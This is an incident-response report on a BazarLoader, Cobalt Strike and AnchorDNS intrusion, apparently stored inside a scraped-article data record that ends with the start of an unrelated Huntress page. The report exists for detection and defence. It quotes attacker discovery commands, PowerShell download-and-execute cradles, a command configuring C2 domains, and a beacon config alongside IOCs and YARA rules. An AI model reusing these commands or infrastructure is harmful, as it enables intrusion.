deployment was not seen in this intrusion the TTP\u2019s used mirror what we would expect from a big game ransomware crew. Case Summary In this case we started with a DocuSign themed Excel maldoc. The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader. Once Bazar was established the malware quickly injected into the Werfault process to avoid detection. As seen in many intrusions the malware then performed some initial discovery with built-in Microsoft utilities such as Nltest. About an hour after initial execution, a Cobalt Strike beacon was loaded, followed shortly by Anchor. Shortly after Cobalt Strike and Anchor were running, the attackers dumped credentials and began moving laterally, starting with a domain controller. Once on the domain controller, the threat actors ran additional discovery but then went quiet. Active command and control was maintained by all three malware samples (Bazar, Cobalt Strike, Anchor DNS) over the next 4 days. During that timeframe, honey documents were interacted with and additional discovery scans were executed. The threat actors were briefly active on day 3 to execute their Get-DataInfo script to collect additional information, which is usually followed closely by Ryuk ransomware. However, on the fifth day the threat actors access was cut off before final objectives could be accomplished. We assess that the end goal of this intrusion was to execute domain wide ransomware. Timeline MITRE ATT&CK Initial Access A DocuSign themed Excel xls was opened and macros were enabled. Thanks to @ffforward for the document as well as the sandbox run leading up to the xls file. New #BazarCall #BazarLoader campaigns. snutrition,net > snutrition,us obpharmacy,net > obpharmacy,us XLS https://t.co/rNLglHadGV EXE https://t.co/D28MoDqSLD IOCs: https://t.co/mc56wgU8EW pic.twitter.com/GiIlKY4tT0 \u2014 TheAnalyst (@ffforward) February 8, 2021 The macro in this maldoc is using Excel 4 Macros. DocuSign was again the social engineering format of choice. After execution, Excel called out to: https://morrislibraryconsulting[.]com/favicam/gertnm.php Execution We saw no further follow on activity from the above execution, potentiality due to the loader site being offline or some other condition not being met. We then executed the follow on malware manually. Bazar Loader \u2013 14wfa5dfs.exe About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process. Shortly after Cobalt Strike was executed, it dropped several Anchor executable files. AnchorDns was then executed via Cobalt Strike which called cmd and then anchorAsjuster. Notice Asjuster passing two domains to anchor_x64.exe which will be used for C2. C:\\Windows\\system32\\cmd.exe /C C:\\Windows\\Temp\\adf\\anchorAsjuster_x64.exe --source=anchorDNS_x64.exe --target=anchor_x64.exe --domain=xyskencevli.com,sluaknhbsoe.com --period=2 --lasthope=2 -guid Defense Evasion Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly. Process injection was also seen in other key system executables such as winlogon.exe. Cobalt Strike was seen locking access to SMB beacons. Anchor was also seen triggering process tampering. Credential Access The threat actors were seen using remote thread creation to inject into lsass to extract credentials. The same activity as seen via a the larger process tree. Disc overy Bazar initiated some discovery activity within 10 minutes of executing. net view /all net view /all /domain nltest.exe /domain_trusts /all_trusts net localgroup \"administrator\" net group \"domain admins\" /domain systeminfo whoami reg query hklm\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\" /s reg query hklm\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\" /s reg query hkcu\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\" /s reg query hkcu\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\" /s Cobalt Strike initiated the following discovery commands: net group \\\"enterprise admins\\\" /domain net group \\\"domain admins\\\" /domain systeminfo On the domain controller the following discovery was run: nltest /dclist:\"DOMAIN.EXAMPLE nltest /domain_trusts /all_trusts IEX (New-Object Net.Webclient).DownloadString('\"http://127.0.0.1:3672/'); Get-NetSubnet IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:45082/'); Get-NetComputer -ping The following PowerShell command was executed from the domain controller. Decoded: IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:13773/'); Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select DNSHostName, IPv4Address, OperatingSystem, LastLogonDate Systems were pinged from the domain controller to confirm connectivity. C:\\Windows\\system32\\cmd.exe /C ping HOSTX Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network. AWS was used to get the public IP of the infected machine, multiple times. checkip.amazonaws.com Minutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller. This time they dropped the files on a domain controller in C:\\info The exact files were mentioned in our Bazar, No Ryuk report. start.bat was executed with the following: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\info\\start.bat\"\" This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1 The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment. This includes things like disk size, connectivity, antivirus software, and backup software. The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times. This script and files are available @ https://thedfirreport.com/services/ Lateral Movement Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike Reviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon. Thanks to 0xtornado and @mattnotmax for this recipe! The threat actors also used SMB beacons executed by remote services as well. We saw this across most machines in the domain. The threat actors also used RDP to login to multiple machines within the domain. Collection We did not witness collection events but we do believe files were collected and exfiltrated over encrypted C2 channels. Command and Control Bazar: 34.210.71[.]206 Certificate: [ ec:c8:db:01:a4:a3:17:36:54:a2:f5:06:44:84:5c:f6:25:6e:4f:74 ] Not Before: 2021/02/04 02:59:01 Not After 2022/02/04 02:59:01 Issuer Org: Global Security Subject Common: example.com Subject Org: Global Security Public Algorithm: rsaEncryption JA3: 51c64c77e60f3980eea90869b68c58a8 JA3s: e35df3e00ca4ef31d42b34bebaa2f86e Certificate: [ 06:32:21:0b:8b:a2:a7:3c:47:a4:33:53:11:a3:11:08:59:48:31:e2 ] Not Before 2020/06/12 20:00:00 Not After 2021/05/22 08:00:00 Issuer Org: Amazon Subject Common: *.v.m2.uw2.app.chime.aws [ *.v.m2.uw2.app.chime.aws ] Public Algorithm: rsaEncryption JA3: fc54e0d16d9764783542f0146a98b300 JA3s: 9e4af711131ebfb2a0cff53c4f2d64e6 We observed the Bazar malware inject into a WerFault process to perform ongoing command and control communication. Anchor: The AnchorDNS malware performed C2 over DNS to the following domains: xyskencevli.com sluaknhbsoe.com Cobalt Strike: 195.123.217[.]45 JARM: 07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1 Certificate: [ 3c:bb:96:de:a7:d7:7a:7d:61:10:7c:53:e3:d0:f5:70:43:54:61:2e ] Not Before: 2021/02/08 03:45:51 Not After: 2021/05/09 04:45:51 Issuer Org: Let's Encrypt Subject Common: gloomix.com [ gloomix.com , www.gloomix.com ] Public Algorithm: rsaEncryption Cobalt Strike Config: | grab_beacon_config: | x86 URI Response: | BeaconType: 0 (HTTP) | Port: 80 | Polling: 45000 | Jitter: 37 | Maxdns: 255 | C2 Server: 195.123 .217 .45 ,/jquery- 3.3 .1 .min.js | User Agent: Mozilla/ 5.0 (Windows NT 6.3 ; Trident/ 7.0 ; rv: 11.0 ) like Gecko | HTTP Method Path 2 : /jquery- 3.3 .2 .min.js | Header1: | Header2: | PipeName: | DNS Idle: J}\\xC4q | DNS Sleep: 0 | Method1: GET | Method2: POST | Spawnto_x86: %windir%\\syswow64\\dllhost.exe | Spawnto_x64: %windir%\\sysnative\\dllhost.exe | Proxy_AccessType: 2 ( Use IE settings ) | | | x64 URI Response : | BeaconType : 0 ( HTTP ) | Port : 80 | Polling : 45000 | Jitter : 37 | Maxdns : 255 | C2 Server : 195.123.217.45,/ jquery -3.3.1. min . js | User Agent : Mozilla /5.0 ( Windows NT 6.3; Trident/ 7.0 ; rv: 11.0 ) like Gecko | HTTP Method Path 2 : /jquery- 3.3 .2 .min.js | Header1: | Header2: | PipeName: | DNS Idle: J}\\xC4q | DNS Sleep: 0 | Method1: GET | Method2: POST | Spawnto_x86: %windir%\\syswow64\\dllhost.exe | Spawnto_x64: %windir%\\sysnative\\dllhost.exe | Proxy_AccessType: 2 ( Use IE settings ) | _ 443/ tcp open https | grab_beacon_config : | x86 URI Response : | BeaconType : 8 ( HTTPS ) | Port : 443 | Polling : 45000 | Jitter : 37 | Maxdns : 255 | C2 Server : gloomix . com ,/ jquery -3.3.1. min . js | User Agent : Mozilla /5.0 ( Windows NT 6.3; Trident/ 7.0 ; rv: 11.0 ) like Gecko | HTTP Method Path 2 : /jquery- 3.3 .2 .min.js | Header1: | Header2: | PipeName: | DNS Idle: J}\\xC4q | DNS Sleep: 0 | Method1: GET | Method2: POST | Spawnto_x86: %windir%\\syswow64\\dllhost.exe | Spawnto_x64: %windir%\\sysnative\\dllhost.exe | Proxy_AccessType: 2 ( Use IE settings ) | | | x64 URI Response : | BeaconType : 8 ( HTTPS ) | Port : 443 | Polling : 45000 | Jitter : 37 | Maxdns : 255 | C2 Server : gloomix . com ,/ jquery -3.3.1. min . js | User Agent : Mozilla /5.0 ( Windows NT 6.3; Trident/ 7.0 ; rv: 11.0 ) like Gecko | HTTP Method Path 2 : /jquery- 3.3 .2 .min.js | Header1: | Header2: | PipeName: | DNS Idle: J}\\xC4q | DNS Sleep: 0 | Method1: GET | Method2: POST | Spawnto_x86: %windir%\\syswow64\\dllhost.exe | Spawnto_x64: %windir%\\sysnative\\dllhost.exe | Proxy_AccessType: 2 ( Use IE settings ) | _ ~tmp01925d3f.exe can be seen communicating with the Cobalt Strike C2 channel. Exfiltration No exfiltration was observed but honey docs were taken off network and opened by the threat actors from remote locations. We assess that this exfiltration was performed over an encrypted C2 channel. This exfiltration has been going on for months and is rarely talked about when it comes to Wizard Spider. Impact We believe this intrusion would have ended with domain wide ransomware. The deployment of the Get-DataInfo.ps1 script and overall TTP\u2019s used in the intrustion are consistent with threat actors associated with deployments of the Ryuk ransomware family. Enjoy our report? Please consider donating $1 or more using Patreon . Thank you for your support! We also have pcaps, memory captures, scripts, executables, and Kape packages available here IOCs If you would like access to our internal MISP and/or threat feeds please see here . Network 54.176.158.165 54.193.234.163 54.241.149.90 208.100.26.238 63.251.235.71 34.210.71.206 195.123.217.45 gloomix.com https://morrislibraryconsulting.com/favicam/gertnm.php xyskencevli.com sluaknhbsoe.com File request_form_1612805504.xls 58eaac6124749d0e93df6d05a4380c22 7e14c560484cb7e8ae065224a7d4978b9939ef9a d9b13ef49c80375e0a8cf20b840b1e8283b35c1a1a6adcbb4173eb25490530e0 ~tmp01925d3f.exe ef7047a0ca52ef7f4d20281b50207f71 61d8f56452fd9df5952fac84f10ea8520ed5958c 10ff83629d727df428af1f57c524e1eaddeefd608c5a317a5bfc13e2df87fb63 anchorAsjuster_x64.exe 9fbc3d560d075f33a15aa67ae74ac6ef a298c6f5f8902fb581a1b5b922f95b362747f9a7 3ab8a1ee10bd1b720e1c8a8795e78cdc09fec73a6bb91526c0ccd2dc2cfbc28d anchorDNS_x64.exe 7160ac4abb26f0ca4c1b6dfba44f8d36 3820ff0d04a233745c79932b77eccfe743a81d34 9fdbd76141ec43b6867f091a2dca503edb2a85e4b98a4500611f5fe484109513 anchor_x64.exe 0be407690fd049ea640dfc64a80c7b2a c9c4ef9b8b39c584d554de8afeb2be6f5648aa6d ca72600f50c76029b6fb71f65423afc44e4e2d93257c3f95fb994adc602f3e1b 14wfa5dfs.exe 9a16a348d3f4e7da3e8746667624115f bebdec590d2a2fffaecb970b73e3067294c9125b 2065157b834e1116abdd5d67167c77c6348361e04a8085aa382909500f1bbe69 extracted-cobalt-strike-beacon.exe 49dc44dfa14a76e139bf5efb4a78aca6 a47fc79bc1f0da5d292a986acdbe9057d3dd15c9 738018c61a8db247615c9a3290c26fbbc4e230d5fbe00c4312401b90813c340c PDB paths anchordns_x64.exe - z:\\d\\git\\anchordns.llvm\\bin\\x64\\release\\anchordns_x64.pdb anchor_x64.exe - z:\\d\\git\\anchordns.llvm\\bin\\x64\\release\\anchordns_x64.pdb ~tmp01925d3f.exe - c:\\users\\hillary\\source\\repos\\gromyko\\release\\gromyko.pdb Accessed Honey Docs IP: 23.94.51[.]80 UA: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MSOffice 12) Detections Network ET INFO Observed DNS Query for EmerDNS TLD (.bazar) ETPRO POLICY External IP Check (checkip.amazonaws.com) ETPRO TROJAN Win32/TrickBot Anchor Variant Style External IP Chec k ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 139 traffic Potential Scan or Infection ET TROJAN ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex/Trickbot CnC) ETPRO POLICY Possibly Suspicious example.com SSL Cert ET POLICY OpenSSL Demo CA - Internet Widgits Pty (O) Sigma https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_enc_cmd.yml https://github.com/Neo23x0/sigma/blob/084cd39505861188d9d8f2d5c0f2835e4f750a3f/rules/windows/process_creation/win_malware_trickbot_recon_activity.yml https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml https://github.com/Neo23x0/sigma/blob/c56cd2dfff6343f3694ef4fd606a305415599737/rules/network/net_dns_c2_detection.yml Yara /* YARA Rule Set Author: The DFIR Report Date: 2021-02-22 Identifier: 1017 Anchoring Bazar Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule bazar_14wfa5dfs { meta: description = \"files - file 14wfa5dfs.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"2065157b834e1116abdd5d67167c77c6348361e04a8085aa382909500f1bbe69\" strings: $s1 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ascii /* base64 encoded string '' */ $s2 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ascii /* base64 encoded string '' */ $s3 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s4 = \"0??dfg.dll ASHI128 bit 98tqewC58752F9578\" fullword ascii $s5 = \"*http://crl4.digicert.com/assured-cs-g1.crl0L\" fullword ascii $s6 = \"*http://crl3.digicert.com/assured-cs-g1.crl00\" fullword ascii $s7 = \"/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L\" fullword ascii $s8 = \"appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={F61A86A8-0045-3726-D207-E8A923987AD2}&lang=ru&browser=4&usagestats=1&appname\" ascii $s9 = \"operator co_await\" fullword ascii $s10 = \"appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={F61A86A8-0045-3726-D207-E8A923987AD2}&lang=ru&browser=4&usagestats=1&appname\" ascii $s11 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide $s12 = \"Google LLC1\" fullword ascii $s13 = \"Google LLC0\" fullword ascii $s14 = \"Unknown issuer0\" fullword ascii $s15 = \"DigiCert, Inc.1$0\\\"\" fullword ascii $s16 = \"=Google%20Chrome&needsadmin=prefers&ap=x64-stable-statsdef_1&installdataindex=empty\" fullword ascii $s17 = \"TIMESTAMP-SHA256-2019-10-150\" fullword ascii $s18 = \"vggwqrwqr7d6\" fullword ascii $s19 = \"api-ms-win-core-file-l1-2-2\" fullword wide /* Goodware String - occured 1 times */ $s20 = \"__swift_2\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 3000KB and ( pe.imphash() == \"d8af53b239700b702d462c81a96d396c\" or 8 of them ) } rule cobalt_strike_tmp01925d3f { meta: description = \"files - file ~tmp01925d3f.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"10ff83629d727df428af1f57c524e1eaddeefd608c5a317a5bfc13e2df87fb63\" strings: $x1 = \"C:\\\\Users\\\\hillary\\\\source\\\\repos\\\\gromyko\\\\Release\\\\gromyko.pdb\" fullword ascii $x2 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ $s3 = \"gromyko32.dll\" fullword ascii $s4 = \"<requestedExecutionLevel level='asInvoker' uiAccess='false'/>\" fullword ascii $s5 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s6 = \"https://sectigo.com/CPS0\" fullword ascii $s7 = \"2http://crl.comodoca.com/AAACertificateServices.crl04\" fullword ascii $s8 = \"?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v\" fullword ascii $s9 = \"3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%\" fullword ascii $s10 = \"http://ocsp.sectigo.com0\" fullword ascii $s11 = \"2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s\" fullword ascii $s12 = \"2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#\" fullword ascii $s13 = \"http://www.digicert.com/CPS0\" fullword ascii $s14 = \"AppPolicyGetThreadInitializationType\" fullword ascii $s15 = \" [email protected] \" fullword ascii $s16 = \"gromyko.inf\" fullword ascii $s17 = \"operator<=>\" fullword ascii $s18 = \"operator co_await\" fullword ascii $s19 = \"gromyko\" fullword ascii $s20 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide condition: uint16(0) == 0x5a4d and filesize < 1000KB and ( pe.imphash() == \"1b1b73382580c4be6fa24e8297e1849d\" or ( 1 of ($x*) or 4 of them ) ) } rule advanced_ip_scanner { meta: description = \"files - file advanced_ip_scanner.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"722fff8f38197d1449df500ae31a95bb34a6ddaba56834b13eaaff2b0f9f1c8b\" strings: $x1 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\" xmlns:asmv3=\\\"urn:schemas-microsoft-com:asm.v3\\\"><t\" ascii $s2 = \"fo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><security><requestedPrivileges><requestedExecutionLevel level=\\\"asInvoker\\\" uiAcce\" ascii $s3 = \"Executable files (*.exe)\" fullword ascii $s4 = \"0RolUpdater.dll\" fullword wide $s5 = \"Qt5WinExtras.dll\" fullword ascii $s6 = \"Radmin.exe\" fullword ascii $s7 = \"ping.exe\" fullword ascii $s8 = \"tracert.exe\" fullword ascii $s9 = \"famatech.com\" fullword ascii $s10 = \"advanced_ip_scanner.exe\" fullword wide $s11 = \"Z:\\\\out\\\\Release\\\\NetUtils\\\\x86\\\\advanced_ip_scanner.pdb\" fullword ascii $s12 = \"Qt5Xml.dll\" fullword ascii $s13 = \"/telnet.exe\" fullword ascii $s14 = \"onTargetScanned\" fullword ascii $s15 = \"CScanTargetsShared\" fullword ascii $s16 = \"1OnCmdScanSelected( CScanTargets& )\" fullword ascii $s17 = \"http://www.advanced-ip-scanner.com/\" fullword ascii $s18 = \"2CmdScanSelected( CScanTargets& )\" fullword ascii $s19 = \"</style></head><body style=\\\" font-family:'MS Shell Dlg 2'; font-size:8.25pt; font-weight:400; font-style:normal;\\\">\" fullword ascii $s20 = \"<a href=\\\"http://www.radmin.com\\\">www.radmin.com</a>\" fullword wide condition: uint16(0) == 0x5a4d and filesize < 5000KB and ( pe.imphash() == \"a3bc8eb6ac4320e91b7faf1e81af2bbf\" or ( 1 of ($x*) or 4 of them ) ) } rule anchor_x64 { meta: description = \"files - file anchor_x64.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"ca72600f50c76029b6fb71f65423afc44e4e2d93257c3f95fb994adc602f3e1b\" strings: $x1 = \"cmd.exe /c timeout 3 && \" fullword wide $x2 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo><security><requestedPrivileges><requeste\" ascii $x3 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ $s4 = \"\\\\System32\\\\cmd.ex\\\\System32\\\\rundllP\" fullword ascii $s5 = \"Z:\\\\D\\\\GIT\\\\anchorDns.llvm\\\\Bin\\\\x64\\\\Release\\\\anchorDNS_x64.pdb\" fullword ascii $s6 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s7 = \"cutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><appli\" ascii $s8 = \"thExecute\" fullword ascii $s9 = \"on xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><windowsSettings><dpiAware xmlns=\\\"http://schemas.microsoft.com/SMI/2005/WindowsSe\" ascii $s10 = \"WinHTTP loader/1.0\" fullword wide $s11 = \"AppPolicyGetThreadInitializationType\" fullword ascii $s12 = \"AnchorDNS.cpp\" fullword ascii $s13 = \"hardWorker.cpp\" fullword ascii $s14 = \"operator<=>\" fullword ascii $s15 = \"operator co_await\" fullword ascii $s16 = \"/C PowerShell \\\"Start-Slemove-Iteep 3; Re\" fullword wide $s17 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo><security><requestedPrivileges><requeste\" ascii $s18 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide $s19 = \"UAWAVAUATVWSH\" fullword ascii $s20 = \"AWAVAUATVWUSH\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 1000KB and ( pe.imphash() == \"e2450fb3cc5b1b7305e3193fe03f3369\" or ( 1 of ($x*) or 4 of them ) ) } rule anchorDNS_x64 { meta: description = \"files - file anchorDNS_x64.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"9fdbd76141ec43b6867f091a2dca503edb2a85e4b98a4500611f5fe484109513\" strings: $x1 = \"cmd.exe /c timeout 3 && \" fullword wide $x2 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo><security><requestedPrivileges><requeste\" ascii $x3 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ $s4 = \"\\\\System32\\\\cmd.ex\\\\System32\\\\rundllP\" fullword ascii $s5 = \"Z:\\\\D\\\\GIT\\\\anchorDns.llvm\\\\Bin\\\\x64\\\\Release\\\\anchorDNS_x64.pdb\" fullword ascii $s6 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s7 = \"cutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><appli\" ascii $s8 = \"thExecute\" fullword ascii $s9 = \"on xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><windowsSettings><dpiAware xmlns=\\\"http://schemas.microsoft.com/SMI/2005/WindowsSe\" ascii $s10 = \"WinHTTP loader/1.0\" fullword wide $s11 = \"AppPolicyGetThreadInitializationType\" fullword ascii $s12 = \"AnchorDNS.cpp\" fullword ascii $s13 = \"hardWorker.cpp\" fullword ascii $s14 = \"operator<=>\" fullword ascii $s15 = \"operator co_await\" fullword ascii $s16 = \"/C PowerShell \\\"Start-Slemove-Iteep 3; Re\" fullword wide $s17 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo><security><requestedPrivileges><requeste\" ascii $s18 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide $s19 = \"UAWAVAUATVWSH\" fullword ascii $s20 = \"AWAVAUATVWUSH\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 1000KB and ( pe.imphash() == \"e2450fb3cc5b1b7305e3193fe03f3369\" or ( 1 of ($x*) or 4 of them ) ) } rule anchorAsjuster_x64 { meta: description = \"files - file anchorAsjuster_x64.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-02-22\" hash1 = \"3ab8a1ee10bd1b720e1c8a8795e78cdc09fec73a6bb91526c0ccd2dc2cfbc28d\" strings: $s1 = \"curity><requestedPrivileges><requestedExecutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"></requestedExecutionLevel></requeste\" ascii $s2 = \"anchorAdjuster* --source=<source file> --target=<target file> --domain=<domain name> --period=<recurrence interval, minutes, def\" ascii $s3 = \"anchorAdjuster* --source=<source file> --target=<target file> --domain=<domain name> --period=<recurrence interval, minutes, def\" ascii $s4 = \"target file \\\"%s\\\"\" fullword ascii $s5 = \"--target=\" fullword ascii $s6 = \"hemas.microsoft.com/SMI/2005/WindowsSettings\\\">true</dpiAware></windowsSettings></application></assembly>\" fullword ascii $s7 = \"error write file, written %i bytes, need write %i bytes, error code %i\" fullword ascii $s8 = \"error create file \\\"%s\\\", code %i\" fullword ascii $s9 = \"guid: %s, shift 0x%08X(%i)\" fullword ascii $s10 = \"ault value 15> -guid --count=<count of instances>\" fullword ascii $s11 = \"domain: shift 0x%08X(%i)\" fullword ascii $s12 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\" ascii $s13 = \"vileges></security></trustInfo><application xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><windowsSettings><dpiAware xmlns=\\\"http:/\" ascii $s14 = \"wrong protocol type\" fullword ascii /* Goodware String - occured 567 times */ $s15 = \"network reset\" fullword ascii /* Goodware String - occured 567 times */ $s16 = \"owner dead\" fullword ascii /* Goodware String - occured 567 times */ $s17 = \"connection already in progress\" fullword ascii /* Goodware String - occured 567 times */ $s18 = \"network down\" fullword ascii /* Goodware String - occured 567 times */ $s19 = \"protocol not supported\" fullword ascii /* Goodware String - occured 568 times */ $s20 = \"connection aborted\" fullword ascii /* Goodware String - occured 568 times */ condition: uint16(0) == 0x5a4d and filesize < 700KB and ( pe.imphash() == \"9859b7a32d1227be2ca925c81ae9265e\" or 8 of them ) } MITRE Spearphishing Link - T1566.002 Command-Line Interface - T1059 Malicious File - T1204.002 Scheduled Task - T1053.005 User Execution - T1204 Process Injection - T1055 DNS - T1071.004 Commonly Used Port - T1043 Application Layer Protocol - T1071 Exfiltration Over C2 Channel - T1041 SMB/Windows Admin Shares - T1021.002 Domain Trust Discovery - T1482 Domain Account - T1087.002 Remote System Discovery - T1018 System Information Discovery - T1082 OS Credential Dumping - T1003 Internal case #1017 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Laravel Apps Leaking Secrets Sodinokibi (aka REvil) Ransomware Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 3
  },
  {
    "url": "http://127.0.0.1:8001/articles/68",
    "title": "Velociraptor WSUS Exploitation, Pt. I: WSUS-Up? | Huntress",
    "content": "Velociraptor WSUS Exploitation, Pt. I: WSUS-Up? | Huntress Huntress Acquires Inside Agent: A New Era for Identity Protection Portal Login Support Contact Search Search Products Products Platform Overview Managed EDR Get full endpoint visibility, detection, and response Managed EDR Get full endpoint visibility, detection, and response Managed ITDR Protect your Microsoft 365 identities and email environments. Managed ITDR Protect your Microsoft 365 identities and email environments. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Integrations Integrations Support Documentation Support Documentation See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Book a Demo See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Solutions Solutions Threats We Stop Phishing Phishing Business Email Compromise Business Email Compromise Ransomware Ransomware View All View All Industries We Serve Education Education Financial Services Financial Services State and Local Government State and Local Government Healthcare Healthcare Law Firms Law Firms Manufacturing Manufacturing Utilities Utilities View All View All Tailored Solutions MSPs MSPs Resellers Resellers SMBs SMBs Compliance Compliance Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Pricing Resources Resources Community Series The Product Lab Shape the next big thing in cybersecurity together. The Product Lab Shape the next big thing in cybersecurity together. Fireside Chat Real people. Real perspectives. Better conversations. Fireside Chat Real people. Real perspectives. Better conversations. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Resources Upcoming Events Upcoming Events eBooks eBooks On-Demand Webinars On-Demand Webinars Videos Videos Whitepapers Whitepapers Datasheets Datasheets Cybersecurity Education Cybersecurity 101 Cybersecurity 101 Cybersecurity Guides Cybersecurity Guides Threat Library Threat Library Real Tradecraft, Real Results Real Tradecraft, Real Results The Huntress Blog Huntress Lands on the Microsoft Marketplace Huntress Lands on the Microsoft Marketplace How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep Live Hacking Into Microsoft 365 with Kyle Hanslovan Live Hacking Into Microsoft 365 with Kyle Hanslovan Why Huntress Why Huntress Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress 